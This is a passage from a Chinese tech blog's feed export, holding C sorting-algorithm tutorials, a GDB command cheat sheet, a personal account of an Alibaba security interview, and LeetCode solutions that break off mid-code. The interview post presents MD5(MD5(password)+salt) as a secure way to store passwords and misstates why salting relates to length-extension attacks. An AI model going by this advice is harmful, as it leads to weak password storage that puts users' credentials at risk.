src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjQ3MTk1OTAtMTQzMzIxOTgyNC5naWY"></p><h3 id="2-2代码"><a href="#2-2代码" class="headerlink" title="2.2代码"></a>2.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">selectionSort</span><span class="hljs-params">(<span class="hljs-type">int</span>* numArray,<span class="hljs-type">int</span> numLen)</span>&#123;<br>    <span class="hljs-type">int</span> i,j,minIndex,temp;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;numLen;i++)&#123;<br>    minIndex = i;<br>    <span class="hljs-keyword">for</span>(j = i;j&lt;numLen;j++)&#123;<br>    <span class="hljs-keyword">if</span>(numArray[j]&lt;numArray[minIndex])&#123;<br>    minIndex = j;<br>    &#125;<br>    &#125;<br>    temp = numArray[minIndex];<br>    numArray[minIndex]=numArray[i];<br>    numArray[i]=temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> numArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3.插入排序"></a>3.插入排序</h2><p>插入排序（Insertion-Sort） 的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><h3 id="3-1算法描述"><a href="#3-1算法描述" class="headerlink" title="3.1算法描述"></a>3.1算法描述</h3><p>一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下：<br>        步骤1: 从第一个元素开始，该元素可以认为已经被排序；<br>        步骤2: 取出下一个元素，在已经排序的元素序列中从后向前扫描；<br>        步骤3: 如果该元素（已排序）大于新元素，将该元素移到下一位置；<br>        步骤4: 重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；<br>        步骤5: 将新元素插入到该位置后；<br>        步骤6: 重复步骤2~5</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjU2NDUyNzctMTE1MTEwMDAwMC5naWY"></p><h3 id="3-2代码"><a href="#3-2代码" class="headerlink" title="3.2代码"></a>3.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">insertionSort</span><span class="hljs-params">(<span class="hljs-type">int</span>* numArray,<span class="hljs-type">int</span> numLen)</span>&#123;<br>    <span class="hljs-type">int</span> i,j,preIndex,temp;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;numLen<span class="hljs-number">-1</span>;i++)&#123;<br>    temp = numArray[i+<span class="hljs-number">1</span>];<br>    preIndex = i;<br>    <span class="hljs-keyword">while</span>(preIndex&gt;=<span class="hljs-number">0</span>&amp;&amp;temp&lt;numArray[preIndex])&#123;<br>    numArray[preIndex+<span class="hljs-number">1</span>]=numArray[preIndex];<br>    preIndex--;<span class="hljs-comment">//标志位前移 </span><br>    &#125;<br>    numArray[preIndex+<span class="hljs-number">1</span>] = temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> numArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4.希尔排序"></a>4.希尔排序</h2><p>希尔排序是希尔（Donald Shell） 于1959年提出的一种排序算法。希尔排序也是一种插入排序，它是简单插入排序经过改进之后的一个更高效的版本，也称为缩小增量排序，同时该算法是冲破O(n2）的第一批算法之一。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫缩小增量排序。</p><p>希尔排序是把记录按下表的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。</p><h3 id="4-1算法描述"><a href="#4-1算法描述" class="headerlink" title="4.1算法描述"></a>4.1算法描述</h3><p>​        我们来看下希尔排序的基本步骤，在此我们选择增量gap&#x3D;length&#x2F;2，缩小增量继续以gap &#x3D; gap&#x2F;2的方式，这种增量选择我们可以用一个序列来表示，{n&#x2F;2,(n&#x2F;2)&#x2F;2…1}，称为增量序列。希尔排序的增量序列的选择与证明是个数学难题，我们选择的这个增量序列是比较常用的，也是希尔建议的增量，称为希尔增量，但其实这个增量序列不是最优的。此处我们做示例使用希尔增量。<br>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：<br>​    步骤1：选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk&#x3D;1；<br>​步骤2：按增量序列个数k，对序列进行k 趟排序；<br>​步骤3：每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p><h3 id="4-2代码"><a href="#4-2代码" class="headerlink" title="4.2代码"></a>4.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">shellSort</span><span class="hljs-params">(<span class="hljs-type">int</span>* numArray,<span class="hljs-type">int</span> numLen)</span>&#123;<br>    <span class="hljs-type">int</span> temp, gap = numLen / <span class="hljs-number">2</span>,i,preIndex;<br>    <span class="hljs-keyword">while</span> (gap &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (i = gap; i &lt; numLen; i++) &#123;<br>            temp = numArray[i];<br>            preIndex = i - gap;<br>            <span class="hljs-keyword">while</span> (preIndex &gt;= <span class="hljs-number">0</span> &amp;&amp; numArray[preIndex] &gt; temp) &#123;<br>                numArray[preIndex + gap] = numArray[preIndex];<br>                preIndex -= gap;<br>            &#125;<br>            numArray[preIndex + gap] = temp;<br>        &#125;<br>        gap /= <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> numArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-归并排序"><a href="#5-归并排序" class="headerlink" title="5.归并排序"></a>5.归并排序</h2><p>和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是O(n log n）的时间复杂度。代价是需要额外的内存空间。<br>归并排序 是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。归并排序是一种稳定的排序方法。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并</p><h3 id="5-1算法描述"><a href="#5-1算法描述" class="headerlink" title="5.1算法描述"></a>5.1算法描述</h3><p>步骤1：把长度为n的输入序列分成两个长度为n&#x2F;2的子序列；<br>步骤2：对这两个子序列分别采用归并排序；<br>步骤3：将两个排序好的子序列合并成一个最终的排序序列。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzA1NTcwNDMtMzczNzUwMTAuZ2lm"></p><h3 id="5-2代码"><a href="#5-2代码" class="headerlink" title="5.2代码"></a>5.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Merge</span><span class="hljs-params">(<span class="hljs-type">int</span> sourceArr[],<span class="hljs-type">int</span> tempArr[], <span class="hljs-type">int</span> startIndex, <span class="hljs-type">int</span> midIndex, <span class="hljs-type">int</span> endIndex)</span><br>&#123;<span class="hljs-comment">//合并序列</span><br>    <span class="hljs-type">int</span> i = startIndex, j=midIndex+<span class="hljs-number">1</span>, k = startIndex;<br>    <span class="hljs-keyword">while</span>(i!=midIndex+<span class="hljs-number">1</span> &amp;&amp; j!=endIndex+<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(sourceArr[i] &gt; sourceArr[j])<br>            tempArr[k++] = sourceArr[j++];<br>        <span class="hljs-keyword">else</span><br>            tempArr[k++] = sourceArr[i++];<br>    &#125;<br>    <span class="hljs-keyword">while</span>(i != midIndex+<span class="hljs-number">1</span>)<br>        tempArr[k++] = sourceArr[i++];<br>    <span class="hljs-keyword">while</span>(j != endIndex+<span class="hljs-number">1</span>)<br>        tempArr[k++] = sourceArr[j++];<br>    <span class="hljs-keyword">for</span>(i=startIndex; i&lt;=endIndex; i++)<br>        sourceArr[i] = tempArr[i];<br>&#125;<br> <br><span class="hljs-comment">//内部使用递归</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MergeSort</span><span class="hljs-params">(<span class="hljs-type">int</span> sourceArr[], <span class="hljs-type">int</span> tempArr[], <span class="hljs-type">int</span> startIndex, <span class="hljs-type">int</span> endIndex)</span><br>&#123;<br>    <span class="hljs-type">int</span> midIndex;<br>    <span class="hljs-keyword">if</span>(startIndex &lt; endIndex)<br>    &#123;<br>        midIndex = startIndex + (endIndex-startIndex) / <span class="hljs-number">2</span>;<br>        MergeSort(sourceArr, tempArr, startIndex, midIndex);<br>        MergeSort(sourceArr, tempArr, midIndex+<span class="hljs-number">1</span>, endIndex);<br>        Merge(sourceArr, tempArr, startIndex, midIndex, endIndex);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="6-快速排序"><a href="#6-快速排序" class="headerlink" title="6.快速排序"></a>6.快速排序</h2><p>快速排序 的基本思想：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。</p><h3 id="6-1算法描述"><a href="#6-1算法描述" class="headerlink" title="6.1算法描述"></a>6.1算法描述</h3><p>快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。具体算法描述如下：<br>        步骤1：从数列中挑出一个元素，称为 “基准”（pivot ）；<br>        步骤2：重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；<br>        步骤3：递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzA5MzYzNzEtMTQxMzUyMzQxMi5naWY"></p><h3 id="6-2代码"><a href="#6-2代码" class="headerlink" title="6.2代码"></a>6.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">quickSort</span><span class="hljs-params">(<span class="hljs-type">int</span> s[], <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (left &lt; right)<br>    &#123;<br>        <span class="hljs-comment">//Swap(s[l], s[(l + r) / 2]); //将中间的这个数和第一个数交换</span><br>        <span class="hljs-type">int</span> i = left, j = right, x = s[left];<br>        <span class="hljs-keyword">while</span> (i &lt; j)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(i &lt; j &amp;&amp; s[j] &gt;= x) <span class="hljs-comment">// 从右向左找第一个小于x的数</span><br>                j--;  <br>            <span class="hljs-keyword">if</span>(i &lt; j) <br>                s[i++] = s[j];<br>            <br>            <span class="hljs-keyword">while</span>(i &lt; j &amp;&amp; s[i] &lt; x) <span class="hljs-comment">// 从左向右找第一个大于等于x的数</span><br>                i++;  <br>            <span class="hljs-keyword">if</span>(i &lt; j) <br>                s[j--] = s[i];<br>        &#125;<br>        s[i] = x;<br>        quickSort(s, left, i - <span class="hljs-number">1</span>); <span class="hljs-comment">// 递归调用 </span><br>        quickSort(s, i + <span class="hljs-number">1</span>, right);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDB逆向调试分析</title>
    <link href="/blog/2020/03/01/GDB%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"/>
    <url>/blog/2020/03/01/GDB%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p><strong>最近在学习堆栈溢出漏洞，势必要深入了解一下Linux下GDB工具的使用了。</strong></p><p><img src="/images/fj35.jpg"></p><span id="more"></span><ol><li>disas + 函数名 查看该函数的汇编代码</li><li>info register 查看寄存器信息，可以简写成i r，后面可以跟寄存器名，表示显示该寄存器值</li><li>si、ni   i是指指令instruction，si是步进而且跟踪进入函数内部，ni不会跟踪进入函数，而是继续执行下面的语句。</li><li>p + 变量名 打印变量信息，可以在p后面加控制信息比如&#x2F;f 浮点格式，c字符，t为二进制，o八，x十六，d十进制 a和x同样是打印十六进制,不同名但同功能</li><li>调试运行中的程序：ps -aux | grep execFile    &#x2F;&#x2F;找到运行中的进程PID，然后使用gdb execFile PID   </li><li>backtrace回溯命令，可以简写为bt，n(next)往下走是看不到已经运行完的错误的，所以我们需要回溯</li><li>info + line 可以查看某一行信息，info是查看详细信息的</li><li>run 运行 r+参数是使用相应的参数运行</li><li>quit 退出GDB</li><li>b + * +地址：逆向调试的时候下断点</li><li>x&#x2F;1 可以查看指令 例如x&#x2F;15i main 查看main函数中的第15条指令</li><li>查看帧信息：（1）frame n: 查看第n桢的信息， frame可以用f缩写（2）frame addr: 查看pc地址为addr的桢的相关信息（3）up n: 查看当前桢上面第n桢的信息（4）down n: 查看当前桢下面第n桢的信息 </li><li>（1）info frame、info frame n或者info frame addr查看更详细的帧的信息，（2）info args：查看当前桢中的参数（3）info locals：查看当前桢中的局部变量（4）info catch：查看当前桢中的异常处理器（exception handlers</li><li>查看调用栈信息：（1）backtrace: 显示程序的调用栈信息，可以用bt缩写（2）backtrace n: 显示程序的调用栈信息，只显示栈顶n桢(frame)（3）backtrace –n: 显示程序的调用栈信息，只显示栈底部n桢(frame)（4）set backtrace limit n: 设置bt显示的最大桢层数（5）where, info stack：都是bt的别名，功能一样</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>阿里钉钉安全部门面试记录</title>
    <link href="/blog/2020/02/27/%E9%98%BF%E9%87%8C%E9%92%89%E9%92%89%E5%AE%89%E5%85%A8%E9%83%A8%E9%97%A8%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <url>/blog/2020/02/27/%E9%98%BF%E9%87%8C%E9%92%89%E9%92%89%E5%AE%89%E5%85%A8%E9%83%A8%E9%97%A8%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p><strong>今天迎来了人生第一次工作面试经历，电话面试，阿里钉钉安全部门主管面试，结果显然不会通过，因为自己没啥准备，也比较菜，阿里的面试也比较难。但是这次经历可以让自己找到差距，了解到了企业想要什么样的，发现自己的基础有多么缺失。</strong></p><p><img src="/images/fj33.jpg"></p><span id="more"></span><h2 id="0x00面试前的流程"><a href="#0x00面试前的流程" class="headerlink" title="0x00面试前的流程"></a>0x00面试前的流程</h2><p>写好简历之后，看到群里有发内推的，就抱着试试看的态度去投看看，本来就没打算过，就是为了想看看实际生产环境需要什么样的知识。简历投递之后稍后就收到了内推学长的回复。第二天面试官就打电话过来说问我第三天有没有时间，效率真的高。</p><h2 id="0x01面试ing"><a href="#0x01面试ing" class="headerlink" title="0x01面试ing"></a>0x01面试ing</h2><p>开始先来了一段自我介绍，没规定时间，自己大概介绍了2分钟吧。</p><p>然后面试官问了一下我的方向和人生规划，如实回答。</p><p>然后面试官让我介绍一下做的项目，我详细的介绍了一下项目，然后面试官就根据我做的项目开始了提问：</p><h4 id="非对称加密签名的原理"><a href="#非对称加密签名的原理" class="headerlink" title="非对称加密签名的原理"></a>非对称加密签名的原理</h4><p>答：私钥加密  公钥验证</p><h4 id="SM2什么加密算法"><a href="#SM2什么加密算法" class="headerlink" title="SM2什么加密算法"></a>SM2什么加密算法</h4><p>答：ECC椭圆曲线算法</p><h4 id="你觉得密码的存储应该怎么做？"><a href="#你觉得密码的存储应该怎么做？" class="headerlink" title="你觉得密码的存储应该怎么做？"></a>你觉得密码的存储应该怎么做？</h4><p>答：用SM3哈希处理之后存储，然后面试官问了一下你了解过业界是怎么做的吗，他提示了我一下加盐。我说加一段随机的字符串后哈希可以提升安全性，他又问为什么可以提升安全性，我没答上来。实际上如果直接hash会遭受查表攻击彩虹表攻击等，不能这么设计，如果随意加盐会造成哈希长度扩展攻击，所以我们可以选用hmac，它通过一个标准算法，在计算哈希的过程中，把key混入计算过程中，可以使程序更安全。其实正确的加盐方式应该如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> MD5(MD5(<span class="hljs-keyword">password</span>)+salt)<br><span class="hljs-number">2.</span> SHA512(SHA512(<span class="hljs-keyword">password</span>)+salt)<br><span class="hljs-number">3.</span> 引入慢哈希: bcrypt(SHA512(<span class="hljs-keyword">password</span>), salt, <span class="hljs-keyword">cost</span>)<br></code></pre></td></tr></table></figure><p>这些方式远比直接加盐哈希安全的多，上课的时候其实是有讲过的，但是当时有点紧张没想起来。</p><h4 id="你了解的双因子认证方式有哪些？"><a href="#你了解的双因子认证方式有哪些？" class="headerlink" title="你了解的双因子认证方式有哪些？"></a>你了解的双因子认证方式有哪些？</h4><p>答：指纹+口令、验证码+口令、面部识别+口令、硬件设备+口令</p><h4 id="硬件设备比如U盾的工作原理是什么？"><a href="#硬件设备比如U盾的工作原理是什么？" class="headerlink" title="硬件设备比如U盾的工作原理是什么？"></a>硬件设备比如U盾的工作原理是什么？</h4><p>答：emmm说实话当时我不知道，真的没了解过这类东西。</p><h4 id="你做的这个双因子认证和他们比有什么优点？"><a href="#你做的这个双因子认证和他们比有什么优点？" class="headerlink" title="你做的这个双因子认证和他们比有什么优点？"></a>你做的这个双因子认证和他们比有什么优点？</h4><p>答：emmmm这时候我懵了，其实笔迹识别这种方式无论准确率还是性能貌似都不如指纹识别。然后呢，面试官就说你当时做这个项目的时候没有横向和纵向的了解吗？我说有了解只是相对于非双因子认证的方式，而没有对同为双因子的指纹识别等进行了解。然后面试官给我上了一课emmmm面试官人挺好的。</p><h4 id="WEP的漏洞是什么？原理？"><a href="#WEP的漏洞是什么？原理？" class="headerlink" title="WEP的漏洞是什么？原理？"></a>WEP的漏洞是什么？原理？</h4><p>答：我只知道WEP是不安全的，因为它的IV长度太短可以被猜测，就简单说了一点我知道的emmm</p><h4 id="你知道有什么安全访问策略吗？"><a href="#你知道有什么安全访问策略吗？" class="headerlink" title="你知道有什么安全访问策略吗？"></a>你知道有什么安全访问策略吗？</h4><p>答：比如Linux的安全组策略，对不同的用户进行分组，每一组的用户拥有相同的权限，不同级别的用户拥有不同的权限。</p><h4 id="假如给你一个WEB页面，你应该如何设计安全访问策略？"><a href="#假如给你一个WEB页面，你应该如何设计安全访问策略？" class="headerlink" title="假如给你一个WEB页面，你应该如何设计安全访问策略？"></a>假如给你一个WEB页面，你应该如何设计安全访问策略？</h4><p>答：分组分角色管理，叭叭叭说了一些</p><h4 id="你还有什么想问的吗？"><a href="#你还有什么想问的吗？" class="headerlink" title="你还有什么想问的吗？"></a>你还有什么想问的吗？</h4><p>您觉得我和阿里入职要求还有多大距离？</p><p>需要的层次比较高，本科生一般达不到安全体系设计的要求，要有经验。</p><p>emmm应该是凉了，不过问题不大，找到了差距，知道了生产环境和实验环境的差别，面试官也教会了很多，挺好的，问题不大。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>整体感觉面试官人很好，很温柔，问的问题也都挺正常的，就是我基础还不够好，以后还要更加努力学习，总之，第一场面试结束了，虽然不是很完美，但是体验还不错，以后等自己水平够了可能就没问题了吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习-1</title>
    <link href="/blog/2020/02/25/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-1/"/>
    <url>/blog/2020/02/25/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-1/</url>
    
    <content type="html"><![CDATA[<p><strong>最近几天写算法写的挺开心的，为了以后保研面试啥的，继续准备算法学习工作，在家闲着也是闲着。</strong></p><p><img src="/images/fj32.jpg"></p><span id="more"></span><h2 id="1-复杂链表的复制"><a href="#1-复杂链表的复制" class="headerlink" title="1.复杂链表的复制"></a>1.复杂链表的复制</h2><h3 id="1-1题目描述"><a href="#1-1题目描述" class="headerlink" title="1.1题目描述"></a>1.1题目描述</h3><p>请实现 copyRandomList 函数，复制一个复杂链表。在复杂链表中，每个节点除了有一个 next 指针指向下一个节点，还有一个 random 指针指向链表中的任意节点或者 null。</p><p>来源：<a href="https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof">https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof</a></p><h3 id="1-2思路分析"><a href="#1-2思路分析" class="headerlink" title="1.2思路分析"></a>1.2思路分析</h3><p>采用深度优先搜索：</p><ul><li>从头结点 head 开始拷贝；</li><li>由于一个结点可能被多个指针指到，因此如果该结点已被拷贝，则不需要重复拷贝；</li><li>如果还没拷贝该结点，则创建一个新的结点进行拷贝，并将拷贝过的结点保存在哈希表中；</li><li>使用递归拷贝所有的 next 结点，再递归拷贝所有的 random 结点。</li></ul><h3 id="1-3代码"><a href="#1-3代码" class="headerlink" title="1.3代码"></a>1.3代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># Definition for a Node.</span><br><span class="hljs-string">class Node:</span><br><span class="hljs-string">    def __init__(self, x: int, next: &#x27;Node&#x27; = None, random: &#x27;Node&#x27; = None):</span><br><span class="hljs-string">        self.val = int(x)</span><br><span class="hljs-string">        self.next = next</span><br><span class="hljs-string">        self.random = random</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">copyRandomList</span>(<span class="hljs-params">self, head: <span class="hljs-string">&#x27;Node&#x27;</span></span>) -&gt; <span class="hljs-string">&#x27;Node&#x27;</span>:<br>        <span class="hljs-comment">#递归遍历复制所有节点</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">head</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> head: <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">if</span> head <span class="hljs-keyword">in</span> visited:<br>                <span class="hljs-keyword">return</span> visited[head]<br>            <span class="hljs-comment"># 创建新结点</span><br>            copy = Node(head.val, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>            visited[head] = copy<br>            copy.<span class="hljs-built_in">next</span> = dfs(head.<span class="hljs-built_in">next</span>)<br>            copy.random = dfs(head.random)<br>            <span class="hljs-keyword">return</span> copy<br>        visited = &#123;&#125;<br>        <span class="hljs-keyword">return</span> dfs(head)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># Definition for a Node.</span><br><span class="hljs-string">class Node:</span><br><span class="hljs-string">    def __init__(self, x: int, next: &#x27;Node&#x27; = None, random: &#x27;Node&#x27; = None):</span><br><span class="hljs-string">        self.val = int(x)</span><br><span class="hljs-string">        self.next = next</span><br><span class="hljs-string">        self.random = random</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#直接调用深度复制deepcopy函数即可</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">copyRandomList</span>(<span class="hljs-params">self, head: <span class="hljs-string">&#x27;Node&#x27;</span></span>) -&gt; <span class="hljs-string">&#x27;Node&#x27;</span>:<br>        <span class="hljs-keyword">return</span> copy.deepcopy(head)<br></code></pre></td></tr></table></figure><h2 id="2-对称二叉树"><a href="#2-对称二叉树" class="headerlink" title="2.对称二叉树"></a>2.对称二叉树</h2><h3 id="2-1题目描述"><a href="#2-1题目描述" class="headerlink" title="2.1题目描述"></a>2.1题目描述</h3><p>给定一个二叉树，检查它是否是镜像对称的。</p><p>例如，二叉树 [1,2,2,3,4,4,3] 是对称的。</p><pre><code class="hljs">1</code></pre><p>   &#x2F; <br>  2   2<br> &#x2F; \ &#x2F; <br>3  4 4  3</p><p>但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:</p><pre><code class="hljs">1</code></pre><p>   &#x2F; <br>  2   2<br>   \   <br>   3    3</p><p>来源：<a href="https://leetcode-cn.com/problems/symmetric-tree">https://leetcode-cn.com/problems/symmetric-tree</a></p><h3 id="2-2思路分析"><a href="#2-2思路分析" class="headerlink" title="2.2思路分析"></a>2.2思路分析</h3><p>首先第一眼就反应到应该用递归操作比较简单，递归结束的条件是探索到叶子节点。</p><p>如果左右叶子都为NULL，证明该节点为叶节点</p><p>对称树要求左边叶子值等于右半部分对应叶子右边的值，于是递归条件就是判断相应的值是不是相等，是否有对应的节点。</p><h3 id="2-3代码"><a href="#2-3代码" class="headerlink" title="2.3代码"></a>2.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary 